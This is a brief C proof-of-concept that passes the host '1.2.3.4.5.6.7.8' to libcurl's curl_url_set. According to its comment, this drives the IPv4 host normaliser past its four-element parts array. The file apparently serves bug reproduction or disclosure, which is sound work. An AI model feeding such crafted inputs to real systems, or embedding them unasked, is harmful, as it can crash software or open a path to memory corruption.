/* PoC: curl_url_set(CURLUPART_HOST, ...) legacy-numeric IPv4 normalization.
   A numeric-looking host with more than four dotted parts drives the host
   normalizer past the end of its 4-element parts[] array. */
#include <curl/curl.h>
#include <stdio.h>

int main(void)
{
  CURLU *u = curl_url();
  CURLUcode rc;
  if(!u)
    return 1;
  rc = curl_url_set(u, CURLUPART_HOST, "1.2.3.4.5.6.7.8", 0);
  printf("curl_url_set rc=%d\n", (int)rc);
  curl_url_cleanup(u);
  return 0;
}
